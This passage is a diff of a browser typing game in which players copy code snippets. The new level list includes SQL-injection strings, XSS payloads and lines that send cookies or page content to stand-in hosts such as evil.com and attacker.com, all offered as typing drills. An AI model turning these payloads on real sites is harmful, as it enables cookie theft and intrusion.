@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
-    <title>Stealth HTML Coder v1.0 - CityUnicorn Studio</title>
+    <title>Stealth HTML Coder v1.1</title>
     <style>
+        /* --- CORE RESET --- */
         * { 
             box-sizing: border-box; 
             touch-action: manipulation; 
@@ -20,20 +20,15 @@
             padding: 0;
         }
         
-        html, body {
-            width: 100%;
-            height: 100%;
-            height: 100dvh;
+        body {
+            font-family: 'Courier New', monospace;
             background: #0a0a0a;
             color: #00ff41;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, 'Courier New', monospace;
-            overflow: hidden;
-        }
-
-        body {
+            height: 100vh;
+            height: 100dvh;
             display: flex;
             flex-direction: column;
-            justify-content: space-between;
+            overflow: hidden;
         }
 
         /* --- START MENU & PARTICLE STYLES --- */
@@ -52,10 +47,8 @@
 
         #particle-container {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             overflow: hidden;
             pointer-events: none;
             z-index: 1;
@@ -99,16 +92,17 @@
         }
 
         .menu-title {
-            font-size: 32px;
+            font-size: 34px;
             font-weight: 800;
             color: #ffffff;
-            margin-bottom: 40px;
+            margin-bottom: 48px;
             text-shadow: 0 2px 6px rgba(0, 0, 0, 0.35);
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             line-height: 1.2;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
         .button-group {
@@ -157,9 +151,10 @@
             font-weight: 600;
             color: rgba(255, 255, 255, 0.85);
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
 
-        /* --- LICENSING MODAL --- */
+        /* --- LICENSING MODAL STYLES --- */
         .modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
@@ -193,7 +188,6 @@
             transform: translateY(20px);
             transition: transform 0.25s ease;
             overflow: hidden;
-            text-align: left;
         }
 
         .modal-overlay.active .modal-card { transform: translateY(0); }
@@ -207,7 +201,11 @@
             background: rgba(255, 255, 255, 0.03);
         }
 
-        .modal-header h2 { font-size: 18px; font-weight: 700; color: #ffffff; display: flex; align-items: center; gap: 8px; }
+        .modal-header h2 { 
+            font-size: 18px; font-weight: 700; color: #ffffff; 
+            display: flex; align-items: center; gap: 8px; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
 
         .modal-close-icon {
             background: none; border: none; color: rgba(255, 255, 255, 0.6);
@@ -222,7 +220,12 @@
             color: #d1d5db;
             user-select: text;
             -webkit-user-select: text;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
+
+        .modal-body::-webkit-scrollbar { width: 6px; }
+        .modal-body::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.2); }
+        .modal-body::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.2); border-radius: 4px; }
 
         .modal-body h3 { color: #ffffff; font-size: 15px; margin: 16px 0 6px 0; }
         .modal-body h3:first-child { margin-top: 0; }
@@ -237,7 +240,9 @@
             width: 100%; padding: 12px; background: #334135;
             border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 50px;
             color: #ffffff; font-weight: 700; font-size: 15px; cursor: pointer;
+            transition: background 0.15s ease; font-family: inherit;
         }
+        .btn-close-modal:active { background: #273329; }
 
         /* --- GAME ENGINE STYLES --- */
         .header {
@@ -248,29 +253,33 @@
             justify-content: space-between;
             align-items: center;
             flex-shrink: 0;
-            font-family: 'Courier New', monospace;
         }
 
         .title {
-            font-size: 0.9rem;
+            font-size: 0.95rem;
             font-weight: bold;
             color: #00ff41;
             text-shadow: 0 0 5px #00ff41;
         }
 
-        .stats { display: flex; gap: 10px; font-size: 0.8rem; font-family: 'Courier New', monospace; }
+        .stats { display: flex; gap: 12px; font-size: 0.85rem; }
+
+        .stats-panel {
+            display: flex; justify-content: space-around; padding: 4px 10px; 
+            background: rgba(0,255,65,0.05); border-bottom: 1px solid #00ff41; 
+            font-size: 0.75rem; flex-shrink: 0;
+        }
 
         .security-container {
             background: #111;
             padding: 6px 10px;
             border-bottom: 1px solid #333;
             flex-shrink: 0;
-            font-family: 'Courier New', monospace;
         }
 
         .security-label {
             display: flex; justify-content: space-between;
-            font-size: 0.7rem; color: #ff4444; margin-bottom: 3px; font-weight: bold;
+            font-size: 0.75rem; color: #ff4444; margin-bottom: 4px; font-weight: bold;
         }
 
         .security-bar-bg {
@@ -281,44 +290,50 @@
         .security-bar-fill {
             height: 100%; width: 0%;
             background: linear-gradient(90deg, #ff8800, #ff0000);
-            transition: width 0.2s ease; box-shadow: 0 0 8px #ff0000;
+            transition: width 0.2s ease; box-shadow: 0 0 10px #ff0000;
         }
+
+        .security-bar-fill.critical { animation: pulse-red 0.5s infinite; }
+
+        @keyframes pulse-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
 
         .game-area {
             flex: 1; display: flex; flex-direction: column;
-            padding: 6px 10px; justify-content: space-evenly; overflow: hidden;
-            font-family: 'Courier New', monospace;
+            padding: 8px; overflow-y: auto; justify-content: center;
         }
 
         .mission-box {
             background: rgba(0, 255, 65, 0.05);
-            border: 1px dashed #00ff41; border-radius: 6px;
-            padding: 6px 8px; text-align: center;
+            border: 1px dashed #00ff41; border-radius: 8px;
+            padding: 8px; margin-bottom: 6px; text-align: center;
         }
 
-        .mission-label { font-size: 0.65rem; color: #888; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 1px; }
+        .mission-label {
+            font-size: 0.7rem; color: #888; margin-bottom: 3px;
+            text-transform: uppercase; letter-spacing: 1px;
+        }
 
         .target-code {
             font-size: 1rem; color: #fff; letter-spacing: 1px;
             text-shadow: 0 0 8px #00ff41; word-break: break-all;
         }
 
-        .tag-tip { font-size: 0.7rem; color: #00ff41; margin-top: 4px; font-style: italic; opacity: 0.95; }
-
         .preview-box {
             background: #151515; border: 1px solid #00ff41; border-radius: 6px;
-            padding: 6px; min-height: 36px; max-height: 55px; color: #fff;
-            font-family: sans-serif; display: flex; align-items: center; justify-content: center; overflow: hidden;
+            padding: 8px; margin-bottom: 6px; min-height: 40px; color: #fff;
+            font-family: monospace; display: flex; align-items: center;
+            justify-content: center; overflow: hidden; word-break: break-all;
         }
 
         .input-box {
-            background: #000; border: 2px solid #333; border-radius: 6px;
-            padding: 8px 10px; min-height: 40px; font-size: 1rem; color: #00ff41;
-            position: relative; display: flex; align-items: center; flex-wrap: wrap; word-break: break-all;
+            background: #000; border: 2px solid #333; border-radius: 8px;
+            padding: 8px; min-height: 42px; font-size: 1rem; color: #00ff41;
+            position: relative; display: flex; align-items: center;
+            flex-wrap: wrap; word-break: break-all;
         }
 
-        .input-box.correct { border-color: #00ff41; box-shadow: 0 0 8px #00ff41; }
-        .input-box.error { border-color: #ff4444; box-shadow: 0 0 8px #ff4444; }
+        .input-box.correct { border-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+        .input-box.error { border-color: #ff4444; box-shadow: 0 0 10px #ff4444; }
 
         .cursor {
             display: inline-block; width: 2px; height: 1rem;
@@ -330,56 +345,74 @@
         .char-correct { color: #00ff41; }
         .char-wrong { color: #ff4444; text-decoration: underline; }
 
-        /* KEYBOARD LAYOUT */
         .keyboard {
-            background: #1a1a1a; padding: 4px 2px 8px 2px; border-top: 2px solid #333;
+            background: #1a1a1a; padding: 4px; border-top: 2px solid #333;
             display: flex; flex-direction: column; gap: 3px; flex-shrink: 0;
-            font-family: 'Courier New', monospace;
         }
 
-        .key-row { display: flex; justify-content: center; gap: 2px; width: 100%; }
+        .key-row { display: flex; justify-content: center; gap: 2px; }
 
         .key {
             background: #2a2a2a; color: #fff; border: 1px solid #444;
-            border-radius: 4px; padding: 8px 0; font-size: 0.85rem; font-weight: bold;
-            cursor: pointer; transition: background 0.1s; flex: 1; min-width: 0; text-align: center;
+            border-radius: 4px; padding: 7px 0; font-size: 0.85rem; font-weight: bold;
+            cursor: pointer; transition: background 0.1s, transform 0.05s;
+            min-width: 24px; text-align: center; flex: 1; max-width: 42px;
         }
 
-        .key:active { background: #00ff41; color: #000; }
+        .key:active {
+            background: #555555;
+            color: #ffffff;
+            transform: scale(0.95);
+        }
+
         .key.special { background: #333; color: #00ff41; }
-        .key.backspace { background: #ff4444; color: #fff; flex: 1.4; }
-        .key.space { flex: 3; }
+        .key.backspace { background: #ff4444; color: #fff; flex: 1.5; max-width: 60px; }
+        .key.space { flex: 3; max-width: 140px; }
 
         /* GAME OVER OVERLAY */
         .overlay {
             position: fixed; top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(10, 10, 10, 0.98); display: flex; flex-direction: column;
             justify-content: center; align-items: center; z-index: 600; padding: 20px; text-align: center;
-            font-family: 'Courier New', monospace;
         }
 
         .overlay.hidden { display: none !important; }
-        .overlay h1.caught { color: #ff4444; text-shadow: 0 0 10px #ff4444; font-size: 1.6rem; }
-        .overlay h1.success { color: #00ff41; text-shadow: 0 0 10px #00ff41; font-size: 1.6rem; }
-        .overlay p { color: #aaa; margin: 6px 0; font-size: 0.85rem; }
+        .overlay h1.caught { color: #ff4444; text-shadow: 0 0 10px #ff4444; font-size: 1.8rem; margin-bottom: 10px; }
+        .overlay p { color: #aaa; margin: 6px 0; font-size: 0.9rem; }
 
         .btn-game {
-            background: #00ff41; color: #000; border: none; padding: 14px 28px;
-            font-size: 1rem; font-weight: bold; border-radius: 6px; cursor: pointer;
-            margin-top: 16px; font-family: 'Courier New', monospace; box-shadow: 0 0 10px rgba(0,255,65,0.4);
+            background: #00ff41; color: #000; border: none; padding: 12px 24px;
+            font-size: 1rem; font-weight: bold; border-radius: 8px; cursor: pointer;
+            margin-top: 15px; font-family: 'Courier New', monospace;
         }
+        .btn-game:active { transform: scale(0.95); }
+        .btn-game.danger { background: #ff4444; color: #fff; }
 
         .footer {
-            text-align: center; padding: 4px; font-size: 0.65rem; color: #666;
-            background: #0a0a0a; flex-shrink: 0; font-family: 'Courier New', monospace;
+            text-align: center; padding: 6px; font-size: 0.65rem; color: #555;
+            background: #0a0a0a; flex-shrink: 0;
         }
-        .footer span { color: #00ff41; font-weight: bold; }
+        .footer span { color: #f0f; }
 
         .shake { animation: shake 0.3s; }
         @keyframes shake {
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-4px); }
             75% { transform: translateX(4px); }
+        }
+
+        .notification {
+            position: fixed; top: 80px; left: 50%; transform: translateX(-50%);
+            background: linear-gradient(135deg, #00ff41, #00ccff); color: #000;
+            padding: 10px 20px; border-radius: 8px; font-weight: bold; font-size: 0.85rem;
+            z-index: 1000; animation: slideDown 0.5s ease;
+            box-shadow: 0 10px 30px rgba(0,255,65,0.3); pointer-events: none;
+            text-align: center; white-space: nowrap; font-family: 'Courier New', monospace;
+        }
+
+        @keyframes slideDown {
+            from { transform: translate(-50%, -100px); opacity: 0; }
+            to { transform: translate(-50%, 0); opacity: 1; }
         }
     </style>
 </head>
@@ -394,16 +427,16 @@
             <h1 class="menu-title">STEALTH HTML <span class="emoji">👨‍💻</span></h1>
 
             <div class="button-group">
-                <button class="btn-menu btn-start" id="startBtn" onclick="startGame()">
+                <button class="btn-menu btn-start" onclick="startGame()">
                     <span>🎮</span> Start Game
                 </button>
 
                 <button class="btn-menu btn-license" onclick="openLicensing()">
-                    <span></span> Licensing Info
+                    <span>📄</span> Licensing Info
                 </button>
             </div>
 
-            <div class="menu-version">v1.0 • Mobile Edition<br><span style="font-size:11px; opacity:0.8;">Human + Team AI (#gemini & #qwenai ❤️)</span></div>
+            <div class="menu-version">v1.1 • Mobile Edition<br><span style="font-size:11px; opacity:0.8;">Human + Team AI (#gemini & #qwenai ❤️)</span></div>
         </div>
     </div>
 
@@ -436,27 +469,34 @@
   </div>
 </div>
 
-    <!-- GAME OVER / COMPLETE SCREEN -->
+    <!-- GAME OVER SCREEN -->
     <div class="overlay hidden" id="gameOverScreen">
         <h1 class="caught" id="endTitle">CAUGHT!</h1>
         <p id="endMessage">The Admin Cat saw your syntax error.</p>
-        <p>Level Reached: <span id="endLevel" style="color: #fff; font-weight: bold;">1</span> / 30</p>
+        <p>Level Reached: <span id="endLevel" style="color: #fff; font-weight: bold;">1</span></p>
         <p>Final Score: <span id="endScore" style="color: #00ff41; font-weight: bold;">0</span></p>
-        <button class="btn-game" onclick="startGame()">↺ RETRY PROTOCOL</button>
+        <p>Max Streak: <span id="endStreak" style="color: #ff8800; font-weight: bold;">0</span></p>
+        <button class="btn-game danger" onclick="resetGame()">↺ RETRY PROTOCOL</button>
     </div>
 
-    <!-- MAIN GAME ENGINE UI -->
+    <!-- MAIN GAME UI -->
     <div class="header">
         <div class="title">🔒 STEALTH HTML</div>
         <div class="stats">
-            <div>LVL: <b id="levelDisplay">1</b>/30</div>
+            <div>LVL: <b id="levelDisplay">1</b></div>
             <div>SCORE: <b id="scoreDisplay">0</b></div>
         </div>
     </div>
 
+    <div class="stats-panel">
+        <div>⌨️ Typed: <b id="codesTyped">0</b>/<b id="totalLevels">60</b></div>
+        <div>🔥 Streak: <b id="streak">0</b></div>
+        <div>🏆 Best: <b id="maxStreak">0</b></div>
+    </div>
+
     <div class="security-container">
         <div class="security-label">
-            <span>🐈⬛ SECURITY ALERT</span>
+            <span>🐈‍⬛ SECURITY ALERT</span>
             <span id="securityText">0%</span>
         </div>
         <div class="security-bar-bg">
@@ -467,8 +507,7 @@
     <div class="game-area">
         <div class="mission-box">
             <div class="mission-label">TARGET INJECTION:</div>
-            <div class="target-code" id="targetCode">&lt;!DOCTYPE html&gt;</div>
-            <div class="tag-tip" id="tagTip">Tells the browser this is an HTML5 document.</div>
+            <div class="target-code" id="targetCode">&lt;p&gt;Hi&lt;/p&gt;</div>
         </div>
 
         <div class="mission-label">LIVE PREVIEW:</div>
@@ -480,14 +519,14 @@
         </div>
     </div>
 
-    <!-- CUSTOM KEYBOARD LAYOUT -->
+    <!-- COMPACT HTML/JS KEYBOARD -->
     <div class="keyboard" id="keyboard">
         <div class="key-row">
             <div class="key special" data-key="<">&lt;</div>
-            <div class="key special" data-key="!">!</div>
             <div class="key special" data-key=">">&gt;</div>
             <div class="key special" data-key="/">/</div>
-            <div class="key special" data-key='"'>"</div>
+            <div class="key special" data-key="&quot;">&quot;</div>
+            <div class="key special" data-key="'">&#39;</div>
             <div class="key special" data-key="=">=</div>
             <div class="key special" data-key="#">#</div>
             <div class="key special" data-key=".">.</div>
@@ -540,6 +579,7 @@
             <div class="key" data-key="j">j</div>
             <div class="key" data-key="k">k</div>
             <div class="key" data-key="l">l</div>
+            <div class="key special" data-key="!">!</div>
         </div>
         <div class="key-row">
             <div class="key" data-key="z">z</div>
@@ -549,7 +589,9 @@
             <div class="key" data-key="b">b</div>
             <div class="key" data-key="n">n</div>
             <div class="key" data-key="m">m</div>
-            <div class="key backspace" data-key="back"></div>
+            <div class="key special" data-key="-">-</div>
+            <div class="key special" data-key="_">_</div>
+            <div class="key backspace" data-key="back">⌫</div>
         </div>
         <div class="key-row">
             <div class="key space" data-key=" ">SPACE</div>
@@ -557,17 +599,11 @@
     </div>
 
     <div class="footer">
-        CityUnicorn Studio • Human + <span>Team AI (#gemini & #qwenai ❤️)</span>
+        CityUnicorn Studio • Human + AI Collaboration <span>#qwenai &amp; #gemini ❤️</span>
     </div>
 
 <script>
-    /* Global Catch for WebView Logging */
-    window.onerror = function(message, source, lineno, colno, error) {
-        const btn = document.getElementById('startBtn');
-        if (btn) btn.innerText = "CRASH (L" + lineno + "): " + message;
-    };
-
-    /* Particle Animation Generator */
+    /* --- PARTICLE GENERATOR --- */
     const particleContainer = document.getElementById('particle-container');
 
     function createDroplet() {
@@ -595,104 +631,94 @@
     }
     setInterval(createDroplet, 600);
 
-    /* Modal Controls */
+    /* --- MODAL CONTROLS --- */
     const modal = document.getElementById('licensingModal');
     function openLicensing() { modal.classList.add('active'); }
     function closeLicensing() { modal.classList.remove('active'); }
     function handleOverlayClick(e) { if (e.target === modal) closeLicensing(); }
 
-    /* HTML Levels Data */
-    const levels = [
-        { target: '<!DOCTYPE html>', hint: 'System Init: Declares document as HTML5.' },
-        { target: '<html>', hint: 'System Init: The root element wrapping all page code.' },
-        { target: '<head>', hint: 'Head Section: Holds page metadata & title.' },
-        { target: '<title>Mainframe</title>', hint: 'Page Title: Appears in the browser tab.' },
-        { target: '</head>', hint: 'Closing Tag: Marks the end of the head section.' },
-        { target: '<body>', hint: 'Body Section: Holds all visible content.' },
-        { target: '<h1>Hello World</h1>', hint: 'Heading 1: Top-level header, classic first line!' },
-        { target: '<p>Access Granted</p>', hint: 'Paragraph: Standard text element.' },
-        { target: '</body>', hint: 'Closing Tag: Closes the main body section.' },
-        { target: '</html>', hint: 'System Close: Ends the HTML document.' },
-        { target: '<h2>Security Level</h2>', hint: 'Heading 2: Subheading level.' },
-        { target: '<h3>Substation 04</h3>', hint: 'Heading 3: Minor subheading level.' },
-        { target: '<b>CLASSIFIED</b>', hint: 'Bold: Highlights text with strong weight.' },
-        { target: '<i>Overriding...</i>', hint: 'Italic: Slants text for emphasis.' },
-        { target: '<u>TOP SECRET</u>', hint: 'Underline: Adds underline below text.' },
-        { target: '<hr>', hint: 'Horizontal Line: Creates a visual line divider.' },
-        { target: '<br>', hint: 'Line Break: Moves content down one line.' },
-        { target: '<a href="#">Bypass</a>', hint: 'Anchor Tag: Creates hyperlinks to pages.' },
-        { target: '<img src="cam.jpg">', hint: 'Image Tag: Embeds graphics into pages.' },
-        { target: '<ul>', hint: 'Unordered List: Bulleted list wrapper.' },
-        { target: '<li>Server Node A</li>', hint: 'List Item: An element inside a list.' },
-        { target: '<li>Server Node B</li>', hint: 'List Item: Second element in a list.' },
-        { target: '</ul>', hint: 'Closing Tag: Ends bulleted list.' },
-        { target: '<div class="terminal">', hint: 'Div Tag: Container box for structural layout.' },
-        { target: '<span class="alert">', hint: 'Span Tag: Inline container for small styling.' },
-        { target: '<button>OVERRIDE</button>', hint: 'Button Tag: Interactive clickable element.' },
-        { target: '<input type="text">', hint: 'Input Field: Allows single-line user entry.' },
-        { target: '<input type="password">', hint: 'Input Field: Masks input for secret keying.' },
-        { target: '<p style="color:green;">', hint: 'Inline Style: Direct CSS styling on HTML.' },
-        { target: '<scr'+'ipt>unlock()</scr'+'ipt>', hint: 'Script Tag: Embeds executable JavaScript code.' }
-    ];
-
-    /* Safe Web Audio Context Engine */
-    let audioCtx = null;
-    function initAudio() {
-        try {
-            const AudioContextClass = window.AudioContext || window.webkitAudioContext;
-            if (!audioCtx && AudioContextClass) {
-                audioCtx = new AudioContextClass();
-            }
-            if (audioCtx && audioCtx.state === 'suspended') {
-                audioCtx.resume().catch(e => console.log("Audio resume blocked", e));
-            }
-        } catch (e) {
-            console.log("Audio completely blocked by environment:", e);
-        }
-    }
+    /* --- AUDIO ENGINE --- */
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     
     function playSound(type) {
-        if (!audioCtx) return;
-        try {
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            const now = audioCtx.currentTime;
-            
-            if (type === 'type') {
-                osc.type = 'square'; osc.frequency.setValueAtTime(800, now);
-                gain.gain.setValueAtTime(0.08, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.04);
-                osc.start(now); osc.stop(now + 0.04);
-            } else if (type === 'error') {
-                osc.type = 'sawtooth'; osc.frequency.setValueAtTime(150, now);
-                osc.frequency.linearRampToValueAtTime(100, now + 0.2);
-                gain.gain.setValueAtTime(0.2, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
-                osc.start(now); osc.stop(now + 0.2);
-            } else if (type === 'success') {
-                osc.type = 'sine'; osc.frequency.setValueAtTime(523.25, now);
-                osc.frequency.exponentialRampToValueAtTime(659.25, now + 0.15);
-                gain.gain.setValueAtTime(0.15, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
-                osc.start(now); osc.stop(now + 0.2);
-            } else if (type === 'caught') {
-                osc.type = 'sawtooth'; osc.frequency.setValueAtTime(300, now);
-                osc.frequency.linearRampToValueAtTime(50, now + 0.5);
-                gain.gain.setValueAtTime(0.3, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
-                osc.start(now); osc.stop(now + 0.5);
-            }
-        } catch(e) {}
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        const osc = audioCtx.createOscillator();
+        const gain = audioCtx.createGain();
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        const now = audioCtx.currentTime;
+        
+        if (type === 'type') {
+            osc.type = 'square'; osc.frequency.setValueAtTime(800, now);
+            gain.gain.setValueAtTime(0.1, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.05);
+            osc.start(now); osc.stop(now + 0.05);
+        } else if (type === 'error') {
+            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(150, now);
+            osc.frequency.linearRampToValueAtTime(100, now + 0.2);
+            gain.gain.setValueAtTime(0.3, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
+            osc.start(now); osc.stop(now + 0.2);
+        } else if (type === 'success') {
+            osc.type = 'sine'; osc.frequency.setValueAtTime(600, now);
+            osc.frequency.exponentialRampToValueAtTime(1200, now + 0.1);
+            gain.gain.setValueAtTime(0.2, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.2);
+            osc.start(now); osc.stop(now + 0.2);
+        } else if (type === 'caught') {
+            osc.type = 'sawtooth'; osc.frequency.setValueAtTime(300, now);
+            osc.frequency.linearRampToValueAtTime(50, now + 0.5);
+            gain.gain.setValueAtTime(0.4, now); gain.gain.exponentialRampToValueAtTime(0.01, now + 0.5);
+            osc.start(now); osc.stop(now + 0.5);
+        }
     }
 
-    /* Core Game Loop State */
-    let currentLevel = 0;
+    /* --- GAME DATA & STATE --- */
+    const hackingLevels = [
+        { target: '<h1>Title</h1>' }, { target: '<p>Hello World</p>' }, { target: '<button>Click</button>' },
+        { target: '<div class="container"></div>' }, { target: '<a href="https://example.com">Link</a>' },
+        { target: '<img src="image.jpg" alt="Photo">' }, { target: '<input type="text" placeholder="Enter...">' },
+        { target: '<ul><li>Item 1</li><li>Item 2</li></ul>' }, { target: '<form action="/submit" method="POST"></form>' },
+        { target: '<span style="color:red">Alert</span>' }, { target: '<header><nav><a href="#">Home</a></nav></header>' },
+        { target: '<table><tr><td>Data</td></tr></table>' }, { target: '<select><option value="1">Choice</option></select>' },
+        { target: '<article><h2>Post Title</h2><p>Content</p></article>' }, { target: '<footer><p>&copy; 2026</p></footer>' },
+        { target: '.hidden { display: none; }' }, { target: '#login { background: #000; }' },
+        { target: 'body { margin: 0; padding: 0; }' }, { target: '.btn:hover { opacity: 0.8; }' },
+        { target: 'div { width: 100px; height: 100px; }' }, { target: '.flex { display: flex; justify-content: center; }' },
+        { target: '@media (max-width: 768px) { .hide { display: none; } }' }, { target: 'p::before { content: "> "; }' },
+        { target: '.card { box-shadow: 0 4px 6px rgba(0,0,0,0.1); }' }, { target: 'a { text-decoration: none; color: inherit; }' },
+        { target: 'document.getElementById("admin").remove()' }, { target: "alert('System Breached')" },
+        { target: 'console.log("Access Granted")' }, { target: 'document.querySelector(".password").value = "hacked"' },
+        { target: 'window.location.href = "/admin"' }, { target: 'document.cookie = "admin=true"' },
+        { target: 'setTimeout(() => { execute() }, 1000)' }, { target: 'fetch("/api/data").then(r => r.json())' },
+        { target: 'localStorage.setItem("role", "admin")' }, { target: 'document.body.innerHTML = "<h1>Hacked</h1>"' },
+        { target: '<canvas id="game" width="800" height="600"></canvas>' }, { target: '<video src="hack.mp4" controls></video>' },
+        { target: '<audio src="sound.mp3" autoplay></audio>' }, { target: '<iframe src="about:blank" sandbox></iframe>' },
+        { target: '<svg width="100" height="100"><circle cx="50" cy="50" r="40"/></svg>' },
+        { target: "'; DROP TABLE users; --" }, { target: "' OR '1'='1" }, { target: "UNION SELECT * FROM passwords" },
+        { target: '<div onclick="steal()"></div>' }, { target: '<style>.secret{visibility:hidden}</style>' },
+        { target: '<script>eval(atob("YWxlcnQoMSk="))<' + '/script>' }, { target: 'document.createElement("script").src="/malware.js"' },
+        { target: 'new WebSocket("ws://hacker.com")' }, { target: 'Object.defineProperty(document, "cookie", {get:()=> "stolen"})' },
+        { target: '<meta name="viewport" content="width=device-width, initial-scale=1.0">' }, { target: 'fetch("/api", {method:"POST", body: JSON.stringify({admin:true})})' },
+        { target: 'document.domain = "admin.site.com"' }, { target: 'history.pushState({}, "", "/admin")' },
+        { target: 'new Function("return this")().alert("XSS")' }, { target: 'location.replace("javascript:alert(1)")' },
+        { target: '<img src=x onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">' },
+        { target: 'document.write("<script src=\'//evil.com/steal.js\'><' + '/script>")' },
+        { target: 'setInterval(() => { send(document.cookie) }, 5000)' },
+        { target: 'new Image().src = "http://attacker.com/steal?data=" + document.body.innerHTML' },
+        { target: 'while(true) { hack() }' }
+    ];
+
+    let currentLevelIndex = 0;
+    let currentTarget = '';
     let score = 0;
     let security = 0;
     let typed = '';
     let isPlaying = false;
+    let isEndlessMode = false;
+    let codesTyped = 0;
+    let streak = 0;
+    let maxStreak = 0;
     let securityDecayInterval = null;
 
     const targetCodeEl = document.getElementById('targetCode');
-    const tagTipEl = document.getElementById('tagTip');
     const typedTextEl = document.getElementById('typedText');
     const previewBoxEl = document.getElementById('previewBox');
     const inputBox = document.getElementById('inputBox');
@@ -706,31 +732,59 @@
     const endMessage = document.getElementById('endMessage');
     const endLevel = document.getElementById('endLevel');
     const endScore = document.getElementById('endScore');
+    const endStreak = document.getElementById('endStreak');
+
+    function toggleFullscreen() {
+        const docEl = document.documentElement;
+        if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+            if (docEl.requestFullscreen) docEl.requestFullscreen().catch(err => console.log(err));
+            else if (docEl.webkitRequestFullscreen) docEl.webkitRequestFullscreen();
+        }
+    }
 
     function startGame() {
-        startMenuOverlay.classList.add('hidden');
-        gameOverScreen.classList.add('hidden');
-
-        initAudio();
-
-        currentLevel = 0;
+        if (audioCtx.state === 'suspended') audioCtx.resume();
+        toggleFullscreen();
+        
+        currentLevelIndex = 0;
+        currentTarget = '';
         score = 0;
         security = 0;
+        typed = '';
+        codesTyped = 0;
+        streak = 0;
+        maxStreak = 0;
+        isEndlessMode = false;
         isPlaying = true;
         
+        startMenuOverlay.classList.add('hidden');
+        gameOverScreen.classList.add('hidden');
+        
+        updateStats();
         loadLevel();
         startSecurityDecay();
     }
 
+    function resetGame() {
+        startGame();
+    }
+
     function loadLevel() {
-        if (currentLevel >= levels.length) {
-            gameVictory();
-            return;
+        if (currentLevelIndex >= hackingLevels.length && !isEndlessMode) {
+            isEndlessMode = true;
+            showNotification("🎉 ALL LEVELS COMPLETE! ENTERING ENDLESS MODE...");
         }
+        
+        if (isEndlessMode) {
+            currentTarget = hackingLevels[Math.floor(Math.random() * hackingLevels.length)].target;
+            levelDisplay.innerText = "∞";
+        } else {
+            currentTarget = hackingLevels[currentLevelIndex].target;
+            levelDisplay.innerText = currentLevelIndex + 1;
+        }
+        
         typed = '';
-        targetCodeEl.innerText = levels[currentLevel].target;
-        tagTipEl.innerText = levels[currentLevel].hint;
-        levelDisplay.innerText = currentLevel + 1;
+        targetCodeEl.innerText = currentTarget;
         scoreDisplay.innerText = score;
         updateInputDisplay();
     }
@@ -738,20 +792,21 @@
     function pressKey(key) {
         if (!isPlaying) return;
         
+        const nextCharIndex = typed.length;
+        const nextExpected = currentTarget[nextCharIndex];
+
+        // Auto-convert case if next expected character is uppercase
+        if (nextExpected && nextExpected >= 'A' && nextExpected <= 'Z' && key.length === 1 && key.toLowerCase() === nextExpected.toLowerCase()) {
+            key = key.toUpperCase();
+        }
+
         if (key === 'back') {
             if (typed.length > 0) {
                 typed = typed.slice(0, -1);
                 playSound('type');
             }
         } else {
-            const target = levels[currentLevel].target;
-            const nextCharIndex = typed.length;
-            
-            if (nextCharIndex < target.length && key.toLowerCase() === target[nextCharIndex].toLowerCase()) {
-                typed += target[nextCharIndex]; 
-            } else {
-                typed += key;
-            }
+            typed += key;
             playSound('type');
         }
         
@@ -760,13 +815,11 @@
     }
 
     function checkInput() {
-        const target = levels[currentLevel].target;
-        
-        if (target.startsWith(typed)) {
+        if (currentTarget.startsWith(typed)) {
             inputBox.classList.remove('error');
             inputBox.classList.add('correct');
             
-            if (typed === target) {
+            if (typed === currentTarget) {
                 levelComplete();
             }
         } else {
@@ -776,7 +829,7 @@
             document.getElementById('keyboard').classList.add('shake');
             setTimeout(() => document.getElementById('keyboard').classList.remove('shake'), 300);
             
-            security += 12;
+            security += 15;
             if (security >= 100) {
                 security = 100;
                 gameOver();
@@ -786,19 +839,16 @@
     }
 
     function updateInputDisplay() {
-        const target = levels[currentLevel].target;
         let html = '';
-        
         for (let i = 0; i < typed.length; i++) {
-            if (i < target.length && typed[i] === target[i]) {
+            if (i < currentTarget.length && typed[i] === currentTarget[i]) {
                 html += `<span class="char-correct">${escapeHtml(typed[i])}</span>`;
             } else {
                 html += `<span class="char-wrong">${escapeHtml(typed[i])}</span>`;
             }
         }
-        
         typedTextEl.innerHTML = html;
-        previewBoxEl.innerHTML = typed;
